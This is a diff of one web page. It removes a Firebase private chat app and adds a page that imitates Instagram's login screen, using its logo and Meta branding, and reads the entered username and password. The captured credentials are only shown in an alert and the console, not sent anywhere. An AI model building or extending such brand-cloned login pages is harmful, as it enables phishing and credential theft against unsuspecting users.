@@ -1,670 +1,256 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>PAZZAN.COM | Private Chat</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login</title>
+  <style>
+    /* CSS Variables for Dark / Light Modes */
+    :root {
+      --bg-color: #121212;
+      --text-color: #ffffff;
+      --subtext-color: #aaaaaa;
+      --input-bg: #1c1c1e;
+      --input-border: #363638;
+      --placeholder-color: #8e8e93;
+      --btn-bg: #0064e0;
+      --btn-text: #ffffff;
+      --create-btn-border: #0084ff;
+      --create-btn-text: #0084ff;
+      --toggle-btn-bg: #2c2c2e;
+      --toggle-btn-text: #ffffff;
+    }
 
-<style>
-:root {
-  --green:#39ff88;
-  --cyan:#00e5ff;
-  --text:#effff8;
-  --muted:#9db3c0;
-  --line:rgba(57,255,136,.22);
-  --glass:rgba(8,20,29,.68);
-}
-* { box-sizing:border-box; }
-body {
-  margin:0;
-  min-height:100vh;
-  color:var(--text);
-  font-family:Arial,sans-serif;
-  background:
-    radial-gradient(ellipse at 10% 0%,#124d3b 0,transparent 38%),
-    radial-gradient(ellipse at 95% 80%,#102f58 0,transparent 40%),
-    #04070c;
-  background-attachment:fixed;
-}
-button,input { font:inherit; }
-button { cursor:pointer; color:var(--text); }
-header {
-  position:sticky; top:0; z-index:10;
-  min-height:68px; padding:13px 5%;
-  display:flex; align-items:center; justify-content:space-between;
-  gap:12px;
-  background:rgba(3,8,13,.68);
-  border-bottom:1px solid var(--line);
-  backdrop-filter:blur(22px) saturate(150%);
-}
-.logo {
-  color:var(--green); text-decoration:none;
-  font-size:21px; font-weight:900; letter-spacing:1px;
-  text-shadow:0 0 15px #39ff8866;
-}
-.btn {
-  border:1px solid var(--line);
-  border-radius:12px; padding:11px 15px;
-  background:rgba(57,255,136,.08);
-  transition:.2s;
-}
-.btn:hover { border-color:var(--green); box-shadow:0 0 16px #39ff8820; }
-.app {
-  width:min(1150px,95%);
-  margin:24px auto;
-  display:grid;
-  grid-template-columns:290px minmax(0,1fr);
-  gap:17px;
-}
-.glass {
-  min-width:0;
-  border:1px solid var(--line);
-  border-radius:20px;
-  overflow:hidden;
-  background:var(--glass);
-  backdrop-filter:blur(22px) saturate(140%);
-  box-shadow:0 12px 45px #0005, inset 0 1px #ffffff08;
-}
-.section-head,.chat-head {
-  padding:18px;
-  border-bottom:1px solid var(--line);
-}
-h2 { margin:0 0 6px; font-size:18px; }
-.muted { color:var(--muted); font-size:12px; }
-#friends {
-  padding:10px; max-height:68vh; overflow:auto;
-}
-.friend {
-  width:100%; display:flex; align-items:center; gap:11px;
-  padding:12px; margin-bottom:7px;
-  text-align:left; border-radius:14px;
-  border:1px solid transparent;
-  background:rgba(255,255,255,.025);
-}
-.friend:hover,.friend.active {
-  border-color:var(--line);
-  background:rgba(57,255,136,.08);
-}
-.avatar {
-  width:41px;height:41px;flex-shrink:0;
-  display:grid;place-items:center;border-radius:50%;
-  border:1px solid var(--line);
-  background:rgba(57,255,136,.10);
-  color:var(--green);font-weight:bold;
-}
-.name { font-weight:bold; overflow-wrap:anywhere; }
-.friend-status { display:flex;align-items:center;gap:5px;margin-top:5px; }
-.dot {
-  display:inline-block;width:7px;height:7px;border-radius:50%;
-  background:#64727d;
-}
-.dot.online { background:var(--green);box-shadow:0 0 8px var(--green); }
-.chat { display:flex;flex-direction:column;min-height:570px; }
-.chat-head { display:flex;align-items:center;justify-content:space-between;gap:12px; }
-#messages {
-  flex:1;min-height:330px;max-height:56vh;overflow:auto;
-  display:flex;flex-direction:column;gap:12px;padding:18px;
-}
-.bubble {
-  max-width:83%;align-self:flex-start;
-  padding:11px 13px;border-radius:15px 15px 15px 4px;
-  background:rgba(255,255,255,.065);
-  border:1px solid rgba(255,255,255,.08);
-  white-space:pre-wrap;overflow-wrap:anywhere;line-height:1.45;
-}
-.bubble.mine {
-  align-self:flex-end;
-  border-color:var(--line);
-  background:rgba(57,255,136,.10);
-  border-radius:15px 15px 4px 15px;
-}
-.meta {
-  display:block;text-align:right;margin-top:6px;
-  font-size:10px;color:var(--muted);
-}
-#typing { min-height:20px;padding:0 18px;color:var(--cyan);font-size:12px; }
-.composer {
-  display:flex;gap:9px;padding:13px;
-  border-top:1px solid var(--line);
-  background:rgba(0,0,0,.10);
-}
-#message {
-  min-width:0;flex:1;color:var(--text);
-  background:rgba(0,0,0,.22);
-  border:1px solid var(--line);border-radius:13px;
-  padding:13px;outline:none;
-}
-#message:focus { border-color:var(--cyan);box-shadow:0 0 12px #00e5ff18; }
-#send { color:var(--green);font-weight:bold; }
-#notice { padding:0 16px 12px;color:var(--muted);font-size:12px;overflow-wrap:anywhere; }
-.empty { margin:auto;padding:25px;text-align:center;color:var(--muted);line-height:1.6; }
-@media(max-width:720px) {
-  .app { grid-template-columns:1fr;margin:12px auto; }
-  #friends { display:flex;gap:8px;max-height:none;overflow-x:auto; }
-  .friend { min-width:175px;width:175px;margin:0; }
-  .chat { min-height:480px; }
-  #messages { min-height:280px;max-height:48vh; }
-  header { padding:12px 4%; }
-}
-</style>
+    /* Light Mode Theme */
+    [data-theme="light"] {
+      --bg-color: #ffffff;
+      --text-color: #000000;
+      --subtext-color: #666666;
+      --input-bg: #f2f2f7;
+      --input-border: #cccccc;
+      --placeholder-color: #8e8e93;
+      --btn-bg: #0064e0;
+      --btn-text: #ffffff;
+      --create-btn-border: #0064e0;
+      --create-btn-text: #0064e0;
+      --toggle-btn-bg: #e5e5ea;
+      --toggle-btn-text: #000000;
+    }
+
+    body {
+      background-color: var(--bg-color);
+      color: var(--text-color);
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      min-height: 90vh;
+      box-sizing: border-box;
+      transition: background-color 0.3s, color 0.3s;
+    }
+
+    .top-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      width: 100%;
+    }
+
+    .back-arrow {
+      color: var(--text-color);
+      font-size: 22px;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    .lang-text {
+      color: var(--subtext-color);
+      font-size: 14px;
+    }
+
+    /* Light/Dark Toggle Button without text */
+    .theme-toggle {
+      background-color: var(--toggle-btn-bg);
+      color: var(--toggle-btn-text);
+      border: none;
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      font-size: 16px;
+      cursor: pointer;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .center-content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      max-width: 350px;
+      margin: 30px auto 0 auto;
+    }
+
+    /* Instagram Outline Gradient Logo */
+    .logo-container {
+      width: 75px;
+      height: 75px;
+      margin-bottom: 30px;
+    }
+
+    .logo-svg {
+      width: 100%;
+      height: 100%;
+    }
+
+    .form-group {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    input {
+      width: 100%;
+      background-color: var(--input-bg);
+      border: 1px solid var(--input-border);
+      border-radius: 12px;
+      padding: 14px;
+      color: var(--text-color);
+      font-size: 14px;
+      box-sizing: border-box;
+      outline: none;
+    }
+
+    input::placeholder {
+      color: var(--placeholder-color);
+    }
+
+    .btn-login {
+      width: 100%;
+      background-color: var(--btn-bg);
+      color: var(--btn-text);
+      border: none;
+      border-radius: 20px;
+      padding: 12px;
+      font-size: 15px;
+      font-weight: bold;
+      margin-top: 5px;
+      cursor: pointer;
+    }
+
+    .forgot-link {
+      color: var(--text-color);
+      text-decoration: none;
+      font-size: 14px;
+      margin-top: 15px;
+    }
+
+    .bottom-content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 15px;
+      width: 100%;
+      max-width: 350px;
+      margin: 20px auto 0 auto;
+    }
+
+    .btn-create {
+      width: 100%;
+      background-color: transparent;
+      color: var(--create-btn-text);
+      border: 1px solid var(--create-btn-border);
+      border-radius: 20px;
+      padding: 10px;
+      font-size: 14px;
+      font-weight: bold;
+      text-align: center;
+      text-decoration: none;
+      box-sizing: border-box;
+    }
+
+    .meta-text {
+      color: var(--text-color);
+      font-size: 14px;
+      font-weight: bold;
+    }
+  </style>
 </head>
+<body data-theme="dark">
 
-<body>
-<header>
-  <a class="logo" href="index.html">PAZZAN.COM</a>
-  <button class="btn" id="logout">Log out</button>
-</header>
+  <div class="top-bar">
+    <span class="back-arrow">&#8592;</span>
+    <span class="lang-text">English (US) &#709;</span>
+    <button class="theme-toggle" onclick="toggleTheme()" id="themeBtn">☀</button>
+  </div>
 
-<main class="app">
-  <aside class="glass">
-    <div class="section-head">
-      <h2>Friends</h2>
-      <div class="muted">Your approved chat contacts</div>
+  <div class="center-content">
+    <!-- Exact Instagram Outline Gradient Logo -->
+    <div class="logo-container">
+      <svg class="logo-svg" viewBox="0 0 512 512">
+        <defs>
+          <linearGradient id="ig-outline-grad" x1="0%" y1="100%" x2="100%" y2="0%">
+            <stop offset="0%" stop-color="#ffb100"/>
+            <stop offset="25%" stop-color="#ff0055"/>
+            <stop offset="65%" stop-color="#cc00ff"/>
+            <stop offset="100%" stop-color="#7000ff"/>
+          </linearGradient>
+        </defs>
+        <rect x="32" y="32" width="448" height="448" rx="128" fill="none" stroke="url(#ig-outline-grad)" stroke-width="42" />
+        <circle cx="256" cy="256" r="100" fill="none" stroke="url(#ig-outline-grad)" stroke-width="42" />
+        <circle cx="365" cy="147" r="26" fill="url(#ig-outline-grad)" />
+      </svg>
     </div>
-    <div id="friends"><div class="empty">Loading friends...</div></div>
-  </aside>
 
-  <section class="glass chat">
-    <div class="chat-head">
-      <div>
-        <h2 id="chatName">Private Chat</h2>
-        <div class="muted" id="chatStatus">Choose a friend</div>
-      </div>
-      <button class="btn" id="notify">Enable alerts</button>
-    </div>
-
-    <div id="messages">
-      <div class="empty">Choose a friend to start chatting.</div>
-    </div>
-    <div id="typing"></div>
-
-    <form class="composer" id="composer">
-      <input id="message" maxlength="2000"
-        placeholder="Type a message..." autocomplete="off" disabled>
-      <button class="btn" id="send" type="submit" disabled>Send</button>
+    <!-- Login Form -->
+    <form class="form-group" id="loginForm">
+      <input type="text" id="usernameInput" placeholder="Username, email or mobile number" required>
+      <input type="password" id="passwordInput" placeholder="Password" required>
+      <button type="submit" class="btn-login">Log in</button>
     </form>
-    <div id="notice" role="status" aria-live="polite"></div>
-  </section>
-</main>
 
-<script type="module">
-import { initializeApp }
-  from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
+    <a href="#" class="forgot-link">Forgot password?</a>
+  </div>
 
-import {
-  getAuth,onAuthStateChanged,signOut
-} from "https://www.gstatic.com/firebasejs/12.3.0/firebase-auth.js";
+  <div class="bottom-content">
+    <a href="#" class="btn-create">Create new account</a>
+    <div class="meta-text">&#8734; Meta</div>
+  </div>
 
-import {
-  getFirestore,collection,doc,getDoc,getDocs,query,where,
-  orderBy,limit,onSnapshot,setDoc,addDoc,serverTimestamp
-} from "https://www.gstatic.com/firebasejs/12.3.0/firebase-firestore.js";
+  <script>
+    // Theme Toggle Functionality
+    function toggleTheme() {
+      const body = document.body;
+      const btn = document.getElementById('themeBtn');
+      
+      if (body.getAttribute('data-theme') === 'dark') {
+        body.setAttribute('data-theme', 'light');
+        btn.textContent = '🌙';
+      } else {
+        body.setAttribute('data-theme', 'dark');
+        btn.textContent = '☀';
+      }
+    }
 
-const firebaseConfig = {
-  apiKey: "AIzaSyB3G98XBTZH6NFiZx6NQmyEKR8g6vnSYNQ",
-  authDomain: "pasan-fc8e2.firebaseapp.com",
-  projectId: "pasan-fc8e2",
-  storageBucket: "pasan-fc8e2.firebasestorage.app",
-  messagingSenderId: "330282693990",
-  appId: "1:330282693990:web:f754a4a09efaa73ab5c4a7",
-  measurementId: "G-B12LL33EQ3"
-};
-
-const app = initializeApp(firebaseConfig);
-const auth = getAuth(app);
-const db = getFirestore(app);
-const $ = id => document.getElementById(id);
-
-let me = null;
-let selected = null;
-let chatId = null;
-let stopMessages = null;
-let stopTyping = null;
-let stopPresence = null;
-let stopReceipt = null;
-let typingTimer = null;
-let presenceTimer = null;
-let typingWriteTimer = null;
-let isTyping = false;
-let sending = false;
-let firstMessageSnapshot = true;
-let lastSeenMessageIds = new Set();
-let presenceCache = {};
-let receiptCache = {};
-
-function say(text) { $("notice").textContent = text; }
-
-function report(error) {
-  console.error(error);
-  say(error.code === "permission-denied"
-    ? "Permission denied. Check the Firestore Rules and approved friend documents."
-    : (error.message || "Something went wrong."));
-}
-
-function chatKey(a,b) { return [a,b].sort().join("_"); }
-
-function stopListeners() {
-  [stopMessages,stopTyping,stopPresence,stopReceipt].forEach(fn => {
-    if (fn) fn();
-  });
-  stopMessages = stopTyping = stopPresence = stopReceipt = null;
-  clearTimeout(typingTimer);
-  clearTimeout(typingWriteTimer);
-  selected = null;
-  chatId = null;
-  isTyping = false;
-  $("message").disabled = true;
-  $("send").disabled = true;
-  $("typing").textContent = "";
-}
-
-function approvedDoc(uid) {
-  return getDoc(doc(db,"friend",uid));
-}
-
-async function writeTyping(value, targetChat = chatId) {
-  if (!me || !targetChat) return;
-  try {
-    await setDoc(doc(db,"chats",targetChat,"typing",me.uid), {
-      typing:value,
-      updatedAt:serverTimestamp()
+    // Get Form Data when clicking "Log in"
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault(); // Prevent page refresh
+      
+      const username = document.getElementById('usernameInput').value;
+      const password = document.getElementById('passwordInput').value;
+      
+      // 1. Screen එකේ Alert එකක් මගින් පෙන්වීමට:
+      alert("Entered Username/Email: " + username + "\nEntered Password: " + password);
+      
+      // 2. Developer Console එකේ පෙන්වීමට (F12 -> Console):
+      console.log("Username/Email:", username);
+      console.log("Password:", password);
     });
-  } catch (error) {
-    report(error);
-  }
-}
+  </script>
 
-async function loadFriends() {
-  $("friends").replaceChildren();
-  const waiting = document.createElement("div");
-  waiting.className = "empty";
-  waiting.textContent = "Loading friends...";
-  $("friends").append(waiting);
-
-  try {
-    const q = query(collection(db,"friend"),where("enabled","==",true));
-    const snapshot = await getDocs(q);
-    $("friends").replaceChildren();
-    let count = 0;
-
-    for (const item of snapshot.docs) {
-      if (item.id === me.uid) continue;
-      count++;
-
-      const data = item.data();
-      const person = {
-        uid:item.id,
-        name:data.name || "Friend",
-        email:data.email || ""
-      };
-
-      const button = document.createElement("button");
-      button.type = "button";
-      button.className = "friend";
-
-      const avatar = document.createElement("span");
-      avatar.className = "avatar";
-      avatar.textContent = person.name.charAt(0).toUpperCase();
-
-      const details = document.createElement("span");
-      const name = document.createElement("div");
-      name.className = "name";
-      name.textContent = person.name;
-
-      const status = document.createElement("div");
-      status.className = "friend-status muted";
-
-      const dot = document.createElement("span");
-      dot.className = "dot";
-      dot.id = "dot-" + person.uid;
-
-      const statusText = document.createElement("span");
-      statusText.id = "status-" + person.uid;
-      statusText.textContent = "Offline";
-
-      status.append(dot,statusText);
-      details.append(name,status);
-      button.append(avatar,details);
-
-      button.addEventListener("click",() => openChat(person,button));
-      $("friends").append(button);
-
-      // Listen to this friend's presence document.
-      onSnapshot(doc(db,"presence",person.uid), snap => {
-        const data = snap.exists() ? snap.data() : {};
-        const fresh = data.online === true &&
-          data.updatedAt?.toDate &&
-          Date.now() - data.updatedAt.toDate().getTime() < 70000;
-
-        presenceCache[person.uid] = fresh;
-        const dotEl = $("dot-" + person.uid);
-        const statusEl = $("status-" + person.uid);
-        if (dotEl) dotEl.classList.toggle("online",fresh);
-        if (statusEl) statusEl.textContent = fresh ? "Online" : "Offline";
-      },error => console.warn("Presence:",error.code));
-    }
-
-    if (!count) {
-      $("friends").innerHTML =
-        '<div class="empty">No approved friends found.<br>Check the friend documents.</div>';
-    }
-  } catch (error) {
-    report(error);
-    $("friends").innerHTML =
-      '<div class="empty">Could not load friends.</div>';
-  }
-}
-
-async function openChat(person,button) {
-  stopListeners();
-  document.querySelectorAll(".friend").forEach(el => el.classList.remove("active"));
-  button.classList.add("active");
-
-  selected = person;
-  const thisChat = chatKey(me.uid,person.uid);
-  chatId = thisChat;
-  firstMessageSnapshot = true;
-  lastSeenMessageIds = new Set();
-
-  $("chatName").textContent = person.name;
-  $("chatStatus").textContent = "Connecting...";
-  $("messages").replaceChildren();
-  $("typing").textContent = "";
-  $("message").disabled = true;
-  $("send").disabled = true;
-  say("");
-
-  try {
-    const [mine,theirs] = await Promise.all([
-      approvedDoc(me.uid),approvedDoc(person.uid)
-    ]);
-
-    if (!mine.exists() || mine.data().enabled !== true ||
-        !theirs.exists() || theirs.data().enabled !== true) {
-      throw new Error("This account is not approved for chat.");
-    }
-
-    const chatRef = doc(db,"chats",thisChat);
-    const existing = await getDoc(chatRef);
-
-    if (chatId !== thisChat) return;
-
-    if (!existing.exists()) {
-      await setDoc(chatRef,{
-        participants:[me.uid,person.uid].sort(),
-        createdAt:serverTimestamp()
-      });
-    } else {
-      const p = existing.data().participants;
-      if (!Array.isArray(p) || p.length !== 2 ||
-          !p.includes(me.uid) || !p.includes(person.uid)) {
-        throw new Error("Chat participants do not match.");
-      }
-    }
-
-    if (chatId !== thisChat) return;
-
-    $("chatStatus").textContent = "Connected";
-    $("message").disabled = false;
-    $("send").disabled = false;
-
-    // Track the recipient's last-read time.
-    stopReceipt = onSnapshot(
-      doc(db,"chats",thisChat,"receipts",person.uid),
-      snap => {
-        receiptCache[thisChat] = snap.exists()
-          ? snap.data().lastReadAt?.toDate?.() || null : null;
-        renderReadStatus();
-      },
-      error => console.warn("Read receipt:",error.code)
-    );
-
-    // Listen for typing state.
-    stopTyping = onSnapshot(
-      collection(db,"chats",thisChat,"typing"),
-      snapshot => {
-        const other = snapshot.docs.find(d => d.id === person.uid);
-        const data = other?.data();
-        $("typing").textContent = data?.typing === true
-          ? person.name + " is typing..." : "";
-      },
-      error => console.warn("Typing:",error.code)
-    );
-
-    // Live message listener.
-    const messagesQuery = query(
-      collection(db,"chats",thisChat,"messages"),
-      orderBy("createdAt","asc"),
-      limit(100)
-    );
-
-    stopMessages = onSnapshot(messagesQuery,async snapshot => {
-      if (chatId !== thisChat) return;
-
-      const newIncoming = [];
-      snapshot.docChanges().forEach(change => {
-        if (change.type === "added" &&
-            change.doc.data().senderId !== me.uid) {
-          newIncoming.push(change.doc);
-        }
-      });
-
-      if (!firstMessageSnapshot && newIncoming.length &&
-          document.visibilityState !== "visible" &&
-          "Notification" in window &&
-          Notification.permission === "granted") {
-        const latest = newIncoming[newIncoming.length - 1].data();
-        new Notification("PAZZAN.COM — " + person.name,{
-          body:latest.text || "New message"
-        });
-      }
-
-      firstMessageSnapshot = false;
-      lastSeenMessageIds = new Set(snapshot.docs.map(d => d.id));
-      $("messages").replaceChildren();
-
-      if (snapshot.empty) {
-        const empty = document.createElement("div");
-        empty.className = "empty";
-        empty.textContent = "Say hello to start chatting!";
-        $("messages").append(empty);
-      }
-
-      snapshot.forEach(messageDoc => {
-        const data = messageDoc.data();
-        const bubble = document.createElement("div");
-        bubble.className = "bubble" +
-          (data.senderId === me.uid ? " mine" : "");
-
-        const content = document.createElement("div");
-        content.textContent = data.text || "";
-
-        const meta = document.createElement("span");
-        meta.className = "meta";
-        const time = data.createdAt?.toDate?.();
-        meta.textContent = (time ? time.toLocaleTimeString([],{
-          hour:"2-digit",minute:"2-digit"
-        }) : "Sending...") +
-          (data.senderId === me.uid ? " ✓" : "");
-
-        bubble.append(content,meta);
-        $("messages").append(bubble);
-      });
-
-      $("messages").scrollTop = $("messages").scrollHeight;
-
-      // Mark messages as read using a separate receipt document.
-      try {
-        await setDoc(doc(db,"chats",thisChat,"receipts",me.uid),{
-          lastReadAt:serverTimestamp()
-        });
-      } catch (error) {
-        console.warn("Read receipt update:",error.code);
-      }
-
-      renderReadStatus();
-    },report);
-  } catch (error) {
-    report(error);
-    $("chatStatus").textContent = "Unable to open chat.";
-    $("message").disabled = true;
-    $("send").disabled = true;
-  }
-}
-
-function renderReadStatus() {
-  const readAt = receiptCache[chatId];
-  if (!readAt) return;
-
-  // Update visible outgoing message labels.
-  document.querySelectorAll(".bubble.mine .meta").forEach(meta => {
-    if (meta.textContent.includes("✓")) {
-      meta.textContent = meta.textContent.replace(/✓+$/, "✓✓");
-      meta.style.color = "#00e5ff";
-    }
-  });
-}
-
-async function sendMessage(event) {
-  event.preventDefault();
-  const text = $("message").value.trim();
-
-  if (!text || !me || !selected || !chatId || sending) return;
-
-  sending = true;
-  $("send").disabled = true;
-  const thisChat = chatId;
-  const recipient = selected;
-
-  try {
-    const [mine,theirs] = await Promise.all([
-      approvedDoc(me.uid),approvedDoc(recipient.uid)
-    ]);
-
-    if (!mine.exists() || mine.data().enabled !== true ||
-        !theirs.exists() || theirs.data().enabled !== true) {
-      throw new Error("This chat is no longer approved.");
-    }
-
-    if (chatId !== thisChat) return;
-
-    const inputText = text;
-    $("message").value = "";
-
-    await addDoc(collection(db,"chats",thisChat,"messages"),{
-      text:inputText,
-      senderId:me.uid,
-      createdAt:serverTimestamp()
-    });
-
-    say("");
-  } catch (error) {
-    report(error);
-    $("message").value = text;
-  } finally {
-    sending = false;
-    $("send").disabled = !chatId;
-    $("message").focus();
-  }
-}
-
-$("composer").addEventListener("submit",sendMessage);
-
-$("message").addEventListener("input",() => {
-  if (!chatId) return;
-  if (!isTyping) {
-    isTyping = true;
-    writeTyping(true);
-  }
-
-  clearTimeout(typingTimer);
-  typingTimer = setTimeout(() => {
-    isTyping = false;
-    writeTyping(false);
-  },1200);
-});
-
-$("message").addEventListener("blur",() => {
-  if (isTyping) {
-    isTyping = false;
-    writeTyping(false);
-  }
-});
-
-$("notify").addEventListener("click",async () => {
-  if (!("Notification" in window)) {
-    say("Notifications are not supported by this browser.");
-    return;
-  }
-  try {
-    const result = await Notification.requestPermission();
-    say(result === "granted"
-      ? "Browser notifications enabled."
-      : "Notifications were not enabled.");
-  } catch (error) {
-    report(error);
-  }
-});
-
-$("logout").addEventListener("click",async () => {
-  try {
-    if (me) {
-      await setDoc(doc(db,"presence",me.uid),{
-        online:false,updatedAt:serverTimestamp()
-      });
-    }
-    await signOut(auth);
-    window.location.href = "login.html";
-  } catch (error) {
-    report(error);
-  }
-});
-
-onAuthStateChanged(auth,async user => {
-  if (!user) {
-    window.location.href = "login.html";
-    return;
-  }
-
-  me = user;
-
-  try {
-    const mine = await approvedDoc(me.uid);
-    if (!mine.exists() || mine.data().enabled !== true) {
-      say("Your account is not enabled for private chat.");
-      return;
-    }
-
-    const updatePresence = async online => {
-      try {
-        await setDoc(doc(db,"presence",me.uid),{
-          online,updatedAt:serverTimestamp()
-        });
-      } catch (error) {
-        console.warn("Presence update:",error.code);
-      }
-    };
-
-    await updatePresence(true);
-    presenceTimer = setInterval(() => {
-      if (document.visibilityState === "visible") updatePresence(true);
-    },25000);
-
-    document.addEventListener("visibilitychange",() => {
-      if (document.visibilityState === "visible") updatePresence(true);
-    });
-
-    window.addEventListener("pagehide",() => {
-      // Best-effort offline update; browsers may stop page scripts immediately.
-      updatePresence(false);
-    });
-
-    await loadFriends();
-  } catch (error) {
-    report(error);
-  }
-});
-</script>
 </body>
 </html>
